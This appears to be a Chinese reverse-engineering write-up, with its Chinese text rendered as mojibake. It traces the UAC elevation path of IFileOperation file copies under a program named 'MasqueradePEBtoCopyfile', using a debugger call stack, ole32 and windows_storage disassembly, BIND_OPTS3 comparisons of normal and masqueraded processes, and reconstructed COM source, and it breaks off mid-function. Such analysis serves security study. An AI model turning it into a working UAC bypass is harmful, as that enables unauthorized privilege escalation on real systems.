combase!ClassicSTAThreadWaitForCall 0xf5d764 0x75e59fe5 [0x1] combase!ThreadSendReceive+0xa8a 0xf5d768 0x75dd77f8 [0x2] combase!CSyncClientCall::SwitchAptAndDispatchCall+0xb16 0xf5d768 0x75dd77f8 [0x3] combase!CSyncClientCall::SendReceive2+0xc05 0xf5d768 0x75dd77f8 [0x4] combase!SyncClientCallRetryContext::SendReceiveWithRetry+0x29 0xf5d948 0x75e5c0a7 [0x5] combase!CSyncClientCall::SendReceiveInRetryContext+0x29 0xf5d948 0x75e5c0a7 [0x6] combase!ClassicSTAThreadSendReceive+0x98 0xf5d948 0x75e5c0a7 [0x7] combase!CSyncClientCall::SendReceive+0x2a7 0xf5da0c 0x75de0468 [0x8] combase!CClientChannel::SendReceive+0x79 0xf5dbf8 0x76516b23 [0x9] combase!NdrExtpProxySendReceive+0xc8 0xf5dbf8 0x76516b23 [0xa] RPCRT4!NdrClientCall2+0x9e3 0xf5dc20 0x75eaeaa0 [0xb] combase!ObjectStublessClient+0x70 0xf5e070 0x75ea6a3f [0xc] combase!ObjectStubless+0xf 0xf5e090 0x75e113f5 [0xd] combase!CRpcResolver::DelegateActivationToSCM+0x30e 0xf5e0a0 0x75e8c69c [0xe] combase!CRpcResolver::CreateInstance+0x14 0xf5e1ac 0x75e12d54 [0xf] combase!CClientContextActivator::CreateInstance+0x144 0xf5e1c8 0x75e124d4 [0x10] combase!ActivationPropertiesIn::DelegateCreateInstance+0xc4 0xf5e420 0x75e3a762 [0x11] combase!ICoCreateInstanceEx+0xc12 0xf5e46c 0x75e399d1 [0x12] combase!CComActivator::DoCreateInstance+0x231 0xf5e770 0x75f4bec1 [0x13] combase!CComActivator::StandardCreateInstance+0x81 0xf5e864 0x75ba8686 [0x14] ole32!CLUAMoniker::CreateInstance+0x126 0xf5f0d4 0x63e8f20f [0x15] comsvcs!CNewMoniker::BindToObject+0x12f 0xf5f114 0x75b869cd [0x16] ole32!CCompositeMoniker::BindToObject+0x19d 0xf5f190 0x75b84f9e [0x17] ole32!CoGetObject+0xbe 0xf5f1c4 0x74e70e88 [0x18] windows_storage!CoCreateInstanceAsAdmin+0xb2 0xf5f210 0x74e7e364 [0x19] windows_storage!CFileOperation::_CreateElevatedCopyengine+0x43 0xf5f518 0x74e8293a [0x1a] windows_storage!CFileOperation::_RunElevatedOperation+0x4d 0xf5f58c 0x74ce1761 [0x1b] windows_storage!CFileOperation::_ProcessLUAOperations+0x118056 0xf5f5c0 0x74bc878a [0x1c] windows_storage!CFileOperation::PrepareAndDoOperations+0x238 0xf5f614 0x74bc2274 [0x1d] windows_storage!CFileOperation::PerformOperations+0xd4 0xf5f684 0xa03f55 [0x1e] MasqueradePEBtoCopyfile!wmain+0x365 0xf5f6b4 0xa047fe [0x1f] MasqueradePEBtoCopyfile!__scrt_wide_environment_policy::initialize_environment+0x2e 0xf5f818 0xa04667 [0x20] MasqueradePEBtoCopyfile!__crt_char_traits&lt;wchar_t&gt;::tcscpy_s&lt;wchar_t * &amp;,unsigned int,wchar_t const * const &amp;&gt;+0x1d7 0xf5f82c 0xa044fd [0x21] MasqueradePEBtoCopyfile!__crt_char_traits&lt;wchar_t&gt;::tcscpy_s&lt;wchar_t * &amp;,unsigned int,wchar_t const * const &amp;&gt;+0x6d 0xf5f888 0xa04878 [0x22] MasqueradePEBtoCopyfile!wmainCRTStartup+0x8 0xf5f890 0x76cdfcc9 [0x23] KERNEL32!BaseThreadInitThunk+0x19 0xf5f898 0x77607c6e [0x24] ntdll!__RtlUserThreadStart+0x2f 0xf5f8a8 0x77607c3e [0x25] ntdll!_RtlUserThreadStart+0x1b 0xf5f904 0x0 _RunElevatedOperation æ±‡ç¼–ä»£ç ï¼š ä¸»è¦å…³æ³¨ä¸€ä¸‹å‡ ä¸ªå‡½æ•°ï¼š windows_storage!CFileOperation::_GetElevatedOperation (7546f148) windows_storage!CFileOperation::_CreateElevatedCopyengine (7546e321) windows_storage!CFileOperation::_PerformProperElevatedOperations (7547155d) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 windows_storage!CFileOperation::_RunElevatedOperation:754728ed 8bff mov edi, edi754728ef 55 push ebp754728f0 8bec mov ebp, esp754728f2 83ec14 sub esp, 14h754728f5 a1d0085e75 mov eax, dword ptr [windows_storage!__security_cookie (755e08d0)]754728fa 33c5 xor eax, ebp754728fc 8945fc mov dword ptr [ebp-4], eax754728ff 8b4508 mov eax, dword ptr [ebp+8]75472902 53 push ebx75472903 56 push esi75472904 8b750c mov esi, dword ptr [ebp+0Ch]75472907 8bd9 mov ebx, ecx75472909 57 push edi7547290a 8975f8 mov dword ptr [ebp-8], esi7547290d 33ff xor edi, edi7547290f 8945f4 mov dword ptr [ebp-0Ch], eax75472912 8db3b4030000 lea esi, [ebx+3B4h]75472918 393e cmp dword ptr [esi], edi7547291a 7528 jne windows_storage!CFileOperation::_RunElevatedOperation+0x57 (75472944)7547291c 50 push eax7547291d e826c8ffff call windows_storage!CFileOperation::_GetElevatedOperation (7546f148)75472922 8906 mov dword ptr [esi], eax75472924 85c0 test eax, eax75472926 7519 jne windows_storage!CFileOperation::_RunElevatedOperation+0x54 (75472941)75472928 8d83b8030000 lea eax, [ebx+3B8h]7547292e 8bcb mov ecx, ebx75472930 50 push eax75472931 56 push esi75472932 ff75f4 push dword ptr [ebp-0Ch]75472935 e8e7b9ffff call windows_storage!CFileOperation::_CreateElevatedCopyengine (7546e321)7547293a 8945f0 mov dword ptr [ebp-10h], eax7547293d 85c0 test eax, eax7547293f 7859 js windows_storage!CFileOperation::_RunElevatedOperation+0xad (7547299a)75472941 8b45f4 mov eax, dword ptr [ebp-0Ch]75472944 ff75f8 push dword ptr [ebp-8]75472947 8bcb mov ecx, ebx75472949 50 push eax7547294a ff36 push dword ptr [esi]7547294c e82ef2ffff call windows_storage!CFileOperation::_PrepElevatedOperation (75471b7f)75472951 8945f0 mov dword ptr [ebp-10h], eax75472954 85c0 test eax, eax75472956 7842 js windows_storage!CFileOperation::_RunElevatedOperation+0xad (7547299a)75472958 8b06 mov eax, dword ptr [esi]7547295a 8bcb mov ecx, ebx7547295c 57 push edi7547295d 8983bc000000 mov dword ptr [ebx+0BCh], eax75472963 e8f5ebffff call windows_storage!CFileOperation::_PerformProperElevatedOperations (7547155d)75472968 8b0e mov ecx, dword ptr [esi]7547296a 8945f0 mov dword ptr [ebp-10h], eax7547296d 897df8 mov dword ptr [ebp-8], edi75472970 8b01 mov eax, dword ptr [ecx]75472972 8b7058 mov esi, dword ptr [eax+58h]75472975 8d45f8 lea eax, [ebp-8]75472978 50 push eax75472979 51 push ecx7547297a 8bce mov ecx, esi ole32!CoGetObject: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959676da4ee0 8bff mov edi, edi76da4ee2 55 push ebp76da4ee3 8bec mov ebp, esp76da4ee5 83e4f8 and esp, 0FFFFFFF8h76da4ee8 83ec24 sub esp, 24h76da4eeb a100b4e376 mov eax, dword ptr [ole32!__security_cookie (76e3b400)]76da4ef0 33c4 xor eax, esp76da4ef2 89442420 mov dword ptr [esp+20h], eax76da4ef6 8b4508 mov eax, dword ptr [ebp+8]76da4ef9 89442404 mov dword ptr [esp+4], eax76da4efd 8b450c mov eax, dword ptr [ebp+0Ch]76da4f00 53 push ebx76da4f01 56 push esi76da4f02 8b7510 mov esi, dword ptr [ebp+10h]76da4f05 89442408 mov dword ptr [esp+8], eax76da4f09 8b4514 mov eax, dword ptr [ebp+14h]76da4f0c 89442410 mov dword ptr [esp+10h], eax76da4f10 57 push edi76da4f11 85c0 test eax, eax76da4f13 750a jne ole32!CoGetObject+0x3f (76da4f1f)76da4f15 b857000780 mov eax, 80070057h76da4f1a e9ab000000 jmp ole32!CoGetObject+0xea (76da4fca)76da4f1f 832000 and dword ptr [eax], 076da4f22 8d7c241c lea edi, [esp+1Ch]76da4f26 a5 movs dword ptr es:[edi], dword ptr [esi]76da4f27 32c9 xor cl, cl76da4f29 a5 movs dword ptr es:[edi], dword ptr [esi]76da4f2a a5 movs dword ptr es:[edi], dword ptr [esi]76da4f2b a5 movs dword ptr es:[edi], dword ptr [esi]76da4f2c e81b020000 call ole32!CBindCtx::Create (76da514c)76da4f31 8bd8 mov ebx, eax76da4f33 85db test ebx, ebx76da4f35 750a jne ole32!CoGetObject+0x61 (76da4f41)76da4f37 bf0e000780 mov edi, 8007000Eh76da4f3c e987000000 jmp ole32!CoGetObject+0xe8 (76da4fc8)76da4f41 8b4c240c mov ecx, dword ptr [esp+0Ch]76da4f45 85c9 test ecx, ecx76da4f47 7417 je ole32!CoGetObject+0x80 (76da4f60)76da4f49 8b03 mov eax, dword ptr [ebx]76da4f4b 51 push ecx76da4f4c 53 push ebx76da4f4d 8b7018 mov esi, dword ptr [eax+18h]76da4f50 8bce mov ecx, esi76da4f52 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da4f58 ffd6 call esi76da4f5a 8bf8 mov edi, eax76da4f5c 85ff test edi, edi76da4f5e 7858 js ole32!CoGetObject+0xd8 (76da4fb8)76da4f60 8364240c00 and dword ptr [esp+0Ch], 076da4f65 8d44240c lea eax, [esp+0Ch]76da4f69 50 push eax76da4f6a 8d44241c lea eax, [esp+1Ch]76da4f6e 50 push eax76da4f6f ff742418 push dword ptr [esp+18h]76da4f73 53 push ebx76da4f74 e8270d0000 call ole32!MkParseDisplayName (76da5ca0)76da4f79 8bf8 mov edi, eax76da4f7b 85ff test edi, edi76da4f7d 7821 js ole32!CoGetObject+0xc0 (76da4fa0)76da4f7f ff742414 push dword ptr [esp+14h]76da4f83 8b442410 mov eax, dword ptr [esp+10h]76da4f87 8d4c2420 lea ecx, [esp+20h]76da4f8b 51 push ecx76da4f8c 6a00 push 076da4f8e 53 push ebx76da4f8f 8b30 mov esi, dword ptr [eax]76da4f91 50 push eax76da4f92 8b4e20 mov ecx, dword ptr [esi+20h]76da4f95 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da4f9b ff5620 call dword ptr [esi+20h]76da4f9e 8bf8 mov edi, eax76da4fa0 8b4c240c mov ecx, dword ptr [esp+0Ch]76da4fa4 85c9 test ecx, ecx76da4fa6 7410 je ole32!CoGetObject+0xd8 (76da4fb8)76da4fa8 8b01 mov eax, dword ptr [ecx]76da4faa 51 push ecx76da4fab 8b7008 mov esi, dword ptr [eax+8]76da4fae 8bce mov ecx, esi76da4fb0 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da4fb6 ffd6 call esi76da4fb8 8b03 mov eax, dword ptr [ebx]76da4fba 53 push ebx76da4fbb 8b7008 mov esi, dword ptr [eax+8]76da4fbe 8bce mov ecx, esi76da4fc0 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da4fc6 ffd6 call esi76da4fc8 8bc7 mov eax, edi76da4fca 8b4c242c mov ecx, dword ptr [esp+2Ch]76da4fce 5f pop edi76da4fcf 5e pop esi76da4fd0 5b pop ebx76da4fd1 33cc xor ecx, esp76da4fd3 e8387a0000 call ole32!__security_check_cookie (76daca10)76da4fd8 8be5 mov esp, ebp76da4fda 5d pop ebp76da4fdb c21000 ret 10h æ™®é€šè¿›ç¨‹ 123456789101112131415161718192021220:000&gt; dt BIND_OPTS3 01153c60ole32!BIND_OPTS3 +0x000 cbStruct : 0x76d82450 +0x004 grfFlags : 1 +0x008 grfMode : 0x24 +0x00c dwTickCountDeadline : 0 +0x010 dwTrackFlags : 2 +0x014 dwClassContext : 0 +0x018 locale : 0 +0x01c pServerInfo : 0x00000015 _COSERVERINFO +0x020 hwnd : 0x00000804 HWND__0:000&gt; dt BIND_OPTS3 010ff58cole32!BIND_OPTS3 +0x000 cbStruct : 0x24 +0x004 grfFlags : 0 +0x008 grfMode : 0 +0x00c dwTickCountDeadline : 0 +0x010 dwTrackFlags : 0 +0x014 dwClassContext : 4 +0x018 locale : 0 +0x01c pServerInfo : (null) +0x020 hwnd : (null) ä¼ªè£…è¿›ç¨‹ 123456789101112131415161718192021220:000&gt; dt BIND_OPTS3 01043c68ole32!BIND_OPTS3 +0x000 cbStruct : 0x76d82450 +0x004 grfFlags : 1 +0x008 grfMode : 0x24 +0x00c dwTickCountDeadline : 0 +0x010 dwTrackFlags : 2 +0x014 dwClassContext : 0 +0x018 locale : 0 +0x01c pServerInfo : 0x00000015 _COSERVERINFO +0x020 hwnd : 0x00000804 HWND__0:000&gt; dt BIND_OPTS3 00f3f3ecole32!BIND_OPTS3 +0x000 cbStruct : 0x24 +0x004 grfFlags : 0 +0x008 grfMode : 0 +0x00c dwTickCountDeadline : 0 +0x010 dwTrackFlags : 0 +0x014 dwClassContext : 4 +0x018 locale : 0 +0x01c pServerInfo : (null) +0x020 hwnd : (null) ä¸‹é¢æ˜¯CoGetObjectçš„å‡½æ•°åŸå‹å’Œå¯èƒ½çš„å®ç°ï¼š 12345678910111213141516171819202122HRESULT __stdcall CoGetObject(LPCWSTR pszDisplayName, BIND_OPTS* pBindOptions, REFIID riid, void** ppv)&#123; HRESULT hr = 0; IBindCtx* pBindCtx = 0; hr = CreateBindCtx(0, &amp;pBindCtx); ULONG chEaten; IMoniker* pMoniker = 0; hr = MkParseDisplayName(pBindCtx, pszDisplayName, &amp;chEaten, &amp;pMoniker); hr = pBindCtx-&gt;SetBindOptions(pBindOptions); hr = pMoniker-&gt;BindToObject(pBindCtx, NULL, riid, ppv); // æ™®é€šè¿›ç¨‹åœ¨è¿™ä¸ªå‡½æ•°ä¸­è¿›è¡Œçš„UAC pMoniker-&gt;Release(); pBindCtx-&gt;Release(); return hr;&#125; BindToObject æ±‡ç¼–ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183 ole32!CCompositeMoniker::BindToObject:76da6830 8bff mov edi, edi76da6832 55 push ebp76da6833 8bec mov ebp, esp76da6835 83ec0c sub esp, 0Ch76da6838 53 push ebx76da6839 8b5d18 mov ebx, dword ptr [ebp+18h]76da683c 56 push esi76da683d 57 push edi76da683e 85db test ebx, ebx76da6840 0f84da010000 je ole32!CCompositeMoniker::BindToObject+0x1f0 (76da6a20)76da6846 8b750c mov esi, dword ptr [ebp+0Ch]76da6849 832300 and dword ptr [ebx], 076da684c 56 push esi76da684d e8fefaffff call ole32!IsValidInterface (76da6350)76da6852 85c0 test eax, eax76da6854 0f84c6010000 je ole32!CCompositeMoniker::BindToObject+0x1f0 (76da6a20)76da685a 8b7d10 mov edi, dword ptr [ebp+10h]76da685d 85ff test edi, edi76da685f 740e je ole32!CCompositeMoniker::BindToObject+0x3f (76da686f)76da6861 57 push edi76da6862 e8e9faffff call ole32!IsValidInterface (76da6350)76da6867 85c0 test eax, eax76da6869 0f84b1010000 je ole32!CCompositeMoniker::BindToObject+0x1f0 (76da6a20)76da686f 832300 and dword ptr [ebx], 076da6872 8365fc00 and dword ptr [ebp-4], 076da6876 85ff test edi, edi76da6878 0f85a4000000 jne ole32!CCompositeMoniker::BindToObject+0xf2 (76da6922)76da687e 8b06 mov eax, dword ptr [esi]76da6880 8b7820 mov edi, dword ptr [eax+20h]76da6883 8d45f8 lea eax, [ebp-8]76da6886 50 push eax76da6887 56 push esi76da6888 81ff2070da76 cmp edi, offset ole32!CBindCtx::GetRunningObjectTable (76da7020)76da688e 7507 jne ole32!CCompositeMoniker::BindToObject+0x67 (76da6897)76da6890 e88b070000 call ole32!CBindCtx::GetRunningObjectTable (76da7020)76da6895 eb0a jmp ole32!CCompositeMoniker::BindToObject+0x71 (76da68a1)76da6897 8bcf mov ecx, edi76da6899 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da689f ffd7 call edi76da68a1 8bf8 mov edi, eax76da68a3 85ff test edi, edi76da68a5 7571 jne ole32!CCompositeMoniker::BindToObject+0xe8 (76da6918)76da68a7 8b4df8 mov ecx, dword ptr [ebp-8]76da68aa 8b01 mov eax, dword ptr [ecx]76da68ac 8b7018 mov esi, dword ptr [eax+18h]76da68af 8d45f4 lea eax, [ebp-0Ch]76da68b2 50 push eax76da68b3 ff7508 push dword ptr [ebp+8]76da68b6 51 push ecx76da68b7 81fef06fda76 cmp esi, offset ole32!CRunningObjectTable::GetObjectW (76da6ff0)76da68bd 7507 jne ole32!CCompositeMoniker::BindToObject+0x96 (76da68c6)76da68bf e82c070000 call ole32!CRunningObjectTable::GetObjectW (76da6ff0)76da68c4 eb0a jmp ole32!CCompositeMoniker::BindToObject+0xa0 (76da68d0)76da68c6 8bce mov ecx, esi76da68c8 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da68ce ffd6 call esi76da68d0 8bf8 mov edi, eax76da68d2 8b45f8 mov eax, dword ptr [ebp-8]76da68d5 50 push eax76da68d6 8b08 mov ecx, dword ptr [eax]76da68d8 8b7108 mov esi, dword ptr [ecx+8]76da68db 8bce mov ecx, esi76da68dd ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da68e3 ffd6 call esi76da68e5 85ff test edi, edi76da68e7 7536 jne ole32!CCompositeMoniker::BindToObject+0xef (76da691f)76da68e9 8b4df4 mov ecx, dword ptr [ebp-0Ch]76da68ec 85c9 test ecx, ecx76da68ee 742f je ole32!CCompositeMoniker::BindToObject+0xef (76da691f)76da68f0 8b01 mov eax, dword ptr [ecx]76da68f2 53 push ebx76da68f3 ff7514 push dword ptr [ebp+14h]76da68f6 8b30 mov esi, dword ptr [eax]76da68f8 51 push ecx76da68f9 8bce mov ecx, esi76da68fb ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da6901 ffd6 call esi76da6903 8bf8 mov edi, eax76da6905 8b45f4 mov eax, dword ptr [ebp-0Ch]76da6908 50 push eax76da6909 8b08 mov ecx, dword ptr [eax]76da690b 8b7108 mov esi, dword ptr [ecx+8]76da690e 8bce mov ecx, esi76da6910 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da6916 ffd6 call esi76da6918 8bc7 mov eax, edi76da691a e906010000 jmp ole32!CCompositeMoniker::BindToObject+0x1f5 (76da6a25)76da691f 8b7d10 mov edi, dword ptr [ebp+10h]76da6922 8b4d08 mov ecx, dword ptr [ebp+8]76da6925 e803dbffff call ole32!CCompositeMoniker::AllButLast (76da442d)76da692a 8bd8 mov ebx, eax76da692c 85db test ebx, ebx76da692e 7507 jne ole32!CCompositeMoniker::BindToObject+0x107 (76da6937)76da6930 bf0e000780 mov edi, 8007000Eh76da6935 ebe1 jmp ole32!CCompositeMoniker::BindToObject+0xe8 (76da6918)76da6937 8b4d08 mov ecx, dword ptr [ebp+8]76da693a e8f8dcffff call ole32!CCompositeMoniker::Last (76da4637)76da693f 8945f4 mov dword ptr [ebp-0Ch], eax76da6942 85c0 test eax, eax76da6944 750a jne ole32!CCompositeMoniker::BindToObject+0x120 (76da6950)76da6946 bf0e000780 mov edi, 8007000Eh76da694b e98a000000 jmp ole32!CCompositeMoniker::BindToObject+0x1aa (76da69da)76da6950 85ff test edi, edi76da6952 7436 je ole32!CCompositeMoniker::BindToObject+0x15a (76da698a)76da6954 8b37 mov esi, dword ptr [edi]76da6956 8d45fc lea eax, [ebp-4]76da6959 50 push eax76da695a 6a00 push 076da695c 53 push ebx76da695d 8b4e2c mov ecx, dword ptr [esi+2Ch]76da6960 57 push edi76da6961 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da6967 ff562c call dword ptr [esi+2Ch]76da696a 8bf8 mov edi, eax76da696c 85ff test edi, edi76da696e 792d jns ole32!CCompositeMoniker::BindToObject+0x16d (76da699d)76da6970 8b75f4 mov esi, dword ptr [ebp-0Ch]76da6973 8b06 mov eax, dword ptr [esi]76da6975 56 push esi76da6976 8b4008 mov eax, dword ptr [eax+8]76da6979 8945f4 mov dword ptr [ebp-0Ch], eax76da697c 3d106dda76 cmp eax, offset ole32!CClassMoniker::Release (76da6d10)76da6981 754c jne ole32!CCompositeMoniker::BindToObject+0x19f (76da69cf)76da6983 e888030000 call ole32!CClassMoniker::Release (76da6d10)76da6988 eb50 jmp ole32!CCompositeMoniker::BindToObject+0x1aa (76da69da)76da698a 895dfc mov dword ptr [ebp-4], ebx76da698d 8b03 mov eax, dword ptr [ebx]76da698f 53 push ebx76da6990 8b7004 mov esi, dword ptr [eax+4]76da6993 8bce mov ecx, esi76da6995 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)] # åœ¨è¿™é‡Œå‘èµ·uac76da699b ffd6 call esi76da699d ff7518 push dword ptr [ebp+18h]76da69a0 8b75f4 mov esi, dword ptr [ebp-0Ch]76da69a3 ff7514 push dword ptr [ebp+14h]76da69a6 ff75fc push dword ptr [ebp-4]76da69a9 8b06 mov eax, dword ptr [esi]76da69ab ff750c push dword ptr [ebp+0Ch]76da69ae 56 push esi76da69af 8b7820 mov edi, dword ptr [eax+20h]76da69b2 81ffb054da76 cmp edi, offset ole32!CClassMoniker::BindToObject (76da54b0)76da69b8 7509 jne ole32!CCompositeMoniker::BindToObject+0x193 (76da69c3)76da69ba e8f1eaffff call ole32!CClassMoniker::BindToObject (76da54b0)76da69bf 8bf8 mov edi, eax76da69c1 ebb0 jmp ole32!CCompositeMoniker::BindToObject+0x143 (76da6973)76da69c3 8bcf mov ecx, edi76da69c5 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da69cb ffd7 call edi76da69cd ebf0 jmp ole32!CCompositeMoniker::BindToObject+0x18f (76da69bf)76da69cf 8bc8 mov ecx, eax76da69d1 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da69d7 ff55f4 call dword ptr [ebp-0Ch]76da69da 8b03 mov eax, dword ptr [ebx]76da69dc 53 push ebx76da69dd 8b7008 mov esi, dword ptr [eax+8]76da69e0 81fe906cda76 cmp esi, offset ole32!CSessionMoniker::Release (76da6c90)76da69e6 7507 jne ole32!CCompositeMoniker::BindToObject+0x1bf (76da69ef)76da69e8 e8a3020000 call ole32!CSessionMoniker::Release (76da6c90)76da69ed eb0a jmp ole32!CCompositeMoniker::BindToObject+0x1c9 (76da69f9)76da69ef 8bce mov ecx, esi76da69f1 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da69f7 ffd6 call esi76da69f9 8b4dfc mov ecx, dword ptr [ebp-4]76da69fc 85c9 test ecx, ecx76da69fe 0f8414ffffff je ole32!CCompositeMoniker::BindToObject+0xe8 (76da6918)76da6a04 8b01 mov eax, dword ptr [ecx]76da6a06 51 push ecx76da6a07 8b7008 mov esi, dword ptr [eax+8]76da6a0a 81fe906cda76 cmp esi, offset ole32!CSessionMoniker::Release (76da6c90)76da6a10 0f85f8feffff jne ole32!CCompositeMoniker::BindToObject+0xde (76da690e)76da6a16 e875020000 call ole32!CSessionMoniker::Release (76da6c90)76da6a1b e9f8feffff jmp ole32!CCompositeMoniker::BindToObject+0xe8 (76da6918)76da6a20 b857000780 mov eax, 80070057h76da6a25 5f pop edi76da6a26 5e pop esi76da6a27 5b pop ebx76da6a28 c9 leave 76da6a29 c21400 ret 14h76da6a2c cc int 376da6a2d cc int 376da6a2e cc int 376da6a2f cc int 3 CComActivator::StandardCreateInstance å®šä¹‰ï¼š 1234567891011121314151617181920212223STDMETHODIMP CComActivator::StandardCreateInstance (REFCLSID Clsid, IUnknown *punkOuter, DWORD dwClsCtx, COSERVERINFO *pServerInfo, DWORD dwCount, MULTI_QI *pResults)&#123; // Create ActivationPropertiesIn on stack ActivationPropertiesIn actIn; actIn.SetNotDelete(); // Initialize Actprops with set stuff InitializeActivation(&amp;actIn); return DoCreateInstance(Clsid, punkOuter, dwClsCtx, pServerInfo, dwCount, pResults, &amp;actIn);&#125; DoCreateInstance å®šä¹‰ï¼š 1234567891011121314151617181920212223//--------------------------------------------------------------------// Front end for CreateInstance//-------------------------------------------------------------------- static inline HRESULT DoCreateInstance (REFCLSID Clsid, IUnknown *punkOuter, DWORD dwClsCtx, COSERVERINFO *pServerInfo, DWORD dwCount, MULTI_QI *pResults, ActivationPropertiesIn *pActIn) &#123; DWORD actvFlags = GetActvFlags(dwClsCtx); return ICoCreateInstanceEx( Clsid, punkOuter, dwClsCtx, pServerInfo, dwCount, actvFlags, pResults, pActIn); &#125; ICoCreateInstanceEx å®šä¹‰ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374//+-------------------------------------------------------------------------//// Function: ICoCreateInstanceEx//// Synopsis: Internal version of CoCreateInstance////// Arguments: [Clsid] - requested CLSID// [pServerInfo] - server information block// [punkOuter] - controlling unknown for aggregating// [dwCtrl] - kind of server required// [dwCount] - count of interfaces// [dwActvFlags] - activation flags// [pResults] - MULTI_QI struct of interfaces//// Returns: S_OK - object bound successfully//////--------------------------------------------------------------------------INTERNAL ICoCreateInstanceEx( REFCLSID Clsid, IUnknown * punkOuter, // only relevant locally DWORD dwClsCtx, COSERVERINFO * pServerInfo, DWORD dwCount, DWORD dwActvFlags, MULTI_QI * pResults, ActivationPropertiesIn *pActIn )&#123; int nRetries = 0; Win4Assert(gAssertOnCreate &amp;&amp; &quot;Assertion Testing&quot;); CLSID ConfClsid; HRESULT hrSave = E_FAIL; HRESULT hr = ValidateAndRemapParams(Clsid,dwClsCtx,pServerInfo,dwCount,pResults); if ( FAILED(hr) ) &#123; return hr; &#125; // an OLE 1.0 CLSID, in which case we get back our internal // class factory. IClassFactory *pcf = NULL; if (IsInternalCLSID(Clsid, dwClsCtx, IID_IClassFactory, hr, (void **)&amp;pcf)) &#123; // this is an internally implemented clsid, or an OLE 1.0 class // so we already got the class factory (if available) and set // the return code appropriately. // get the interfaces if ( SUCCEEDED(hr) &amp;&amp; pcf ) &#123; hr = hrSave = CreateInprocInstanceHelper(pcf, dwActvFlags, punkOuter, dwCount, pResults); &#125; &#125; else &#123; // The class is not internal. If the CLSCTX_NO_CUSTOM_MARSHAL flag is set // return E_ACCESSDENIED. if ((dwClsCtx &amp; CLSCTX_NO_CUSTOM_MARSHAL) &amp;&amp; !IsComsvcsCLSID(Clsid) &amp;&amp; !IsMarshalerCLSID(Clsid)) &#123; // don&#x27;t allow custom marshalers that do not belong to // com services. return E_ACCESSDENIED; &#125; // Look in our catalogs for a mapping for this clsid to a configured clsid, // since we store configured clsids in our class caching table. Don&#x27;t fail if // we couldn&#x27;t do the mapping. hr = LookForConfiguredClsid(Clsid, ConfClsid); if (FAILED(hr) &amp;&amp; (hr != REGDB_E_CLASSNOTREG)) goto exit_point; // It&#x27;s OK to pass in GUID_DefaultAppPartition, since // SearchForLoadedClass ignores COM+ classes anyway. CClassCache::CDllClassEntry *pDCE = NULL; ACTIVATION_PROPERTIES ap(ConfClsid, GUID_DefaultAppPartition, IID_IClassFactory, ACTIVATION_PROPERTIES::fDO_NOT_LOAD, dwClsCtx, dwActvFlags, 0, NULL, (IUnknown **) &amp;pcf); hr = CClassCache::SearchForLoadedClass(ap, &amp;pDCE); if ( SUCCEEDED(hr) ) &#123; // Check if it&#x27;s one we need to activate right here if ((!pcf) &amp;&amp; INTERNAL_CLSCTX(dwClsCtx)) &#123; // This goes to the class cache to actually lookup the DPE and // get the factory // // Proxy/Stubs are never partitioned. ACTIVATION_PROPERTIES ap(ConfClsid, GUID_DefaultAppPartition, IID_IClassFactory, 0, dwClsCtx, dwActvFlags, 0, NULL, (IUnknown **) &amp;pcf); hr = hrSave = CCGetClassObject(ap); if (FAILED(hr)) goto exit_point; &#125; if (pcf) &#123; // // an object was found get the interfaces // Win4Assert(!pDCE); hr = hrSave = CreateInprocInstanceHelper(pcf, dwActvFlags, punkOuter, dwCount, pResults); &#125; else &#123; // // do COM+ activation // // Initialize activation properties // Allocate In on stack IActivationPropertiesOut * pOutActivationProperties = NULL; // output if (!pActIn) &#123; pActIn=(ActivationPropertiesIn*) _alloca(sizeof(ActivationPropertiesIn)); pActIn-&gt;ActivationPropertiesIn::ActivationPropertiesIn(); pActIn-&gt;SetNotDelete(TRUE); &#125; AddHydraSessionID(pActIn); AddPartitionID(pActIn); AddOrigClsCtx(pActIn, dwClsCtx); // split the array of structs into individual arrays CSplit_QI SplitQI( hr, dwCount, pResults ); if ( FAILED(hr) ) goto exit_point; DLL_INSTANTIATION_PROPERTIES *pdip; IComClassInfo *pCI = NULL; if ( pDCE ) &#123; pdip = (DLL_INSTANTIATION_PROPERTIES *) _alloca(sizeof(DLL_INSTANTIATION_PROPERTIES)); pdip-&gt;_pDCE = pDCE; pCI = pdip-&gt;_pDCE-&gt;_pClassEntry-&gt;_pCI; if ( pCI ) &#123; pCI-&gt;AddRef(); &#125; &#125; else &#123; pdip = NULL; &#125; BOOL 